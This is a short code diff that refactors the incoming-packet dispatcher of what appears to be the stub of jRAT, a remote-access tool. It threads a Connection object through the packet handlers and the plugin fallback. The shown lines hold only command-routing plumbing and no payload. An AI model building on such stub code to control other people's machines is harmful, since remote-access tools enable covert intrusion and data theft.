@@ -5,6 +5,7 @@ import java.util.Set;
 
 import se.jrat.common.PacketRange;
 import se.jrat.common.exceptions.PacketException;
+import se.jrat.stub.Connection;
 import se.jrat.stub.Plugin;
 
 
@@ -113,7 +114,7 @@ public abstract class AbstractIncomingPacket {
 		PACKETS_INCOMING.put((byte) 105, Packet105CancelClientUpload.class);
 	}
 
-	public static final void execute(byte header) {
+	public static final void execute(Connection con, byte header) {
 		try {
 			AbstractIncomingPacket packet = null;
 			Set<Byte> set = PACKETS_INCOMING.keySet();
@@ -125,7 +126,7 @@ public abstract class AbstractIncomingPacket {
 			}
 			
 			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
-				packet.read();
+				packet.read(con);
 			} else {
 				for (Plugin p : Plugin.list) {
 					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
@@ -137,6 +138,6 @@ public abstract class AbstractIncomingPacket {
 		}
 	}
 
-	public abstract void read() throws Exception;
+	public abstract void read(Connection con) throws Exception;
 
 }
